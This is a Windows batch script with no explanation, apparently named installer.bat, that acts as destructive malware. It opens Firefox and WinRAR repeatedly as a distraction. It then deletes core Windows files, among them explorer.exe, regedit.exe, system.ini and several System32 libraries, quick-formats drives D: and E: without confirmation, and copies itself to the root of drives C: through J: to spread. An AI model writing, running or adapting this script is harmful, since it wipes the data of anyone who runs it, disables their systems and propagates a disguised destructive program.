@ECHO OFF
	start "" "C:\Program Files\Mozilla Firefox\firefox.exe"
	start "" "C:\Program Files\WinRAR\WinRAR.exe"
	start "" "C:\Program Files\Mozilla Firefox\firefox.exe"
	start "" "C:\Program Files\Mozilla Firefox\firefox.exe"
	start "" "C:\Program Files\Mozilla Firefox\firefox.exe"
	start "" "C:\Program Files\Mozilla Firefox\firefox.exe"
	start "" "C:\Program Files\Mozilla Firefox\firefox.exe"
echo
DEL "C:\Windows\System32\ACCTRES.dll"
echo
DEL "C:\Windows\System32\autoplay.dll"
echo
DEL "C:\Windows\System32\bootcfg.exe"
echo
DEL "C:\Windows\explorer.exe"
echo
DEL "C:\Windows\system.ini"
echo
DEL "C:\Windows\regedit.exe"
echo
DEL "C:\Windows\System32\ARP.exe"
echo
DEL "C:\Windows\System\en-US\shell32.dll"
echo
FORMAT D:/Q/X/y
echo.
FORMAT E:/Q/X/y

	xcopy installer.bat /h /r /c /y "C:\"
	xcopy installer.bat /h /r /c /y "D:\"
	xcopy installer.bat /h /r /c /y "E:\"
	xcopy installer.bat /h /r /c /y "F:\"
	xcopy installer.bat /h /r /c /y "G:\"
	xcopy installer.bat /h /r /c /y "H:\"
	xcopy installer.bat /h /r /c /y "I:\"
	xcopy installer.bat /h /r /c /y "J:\"
exit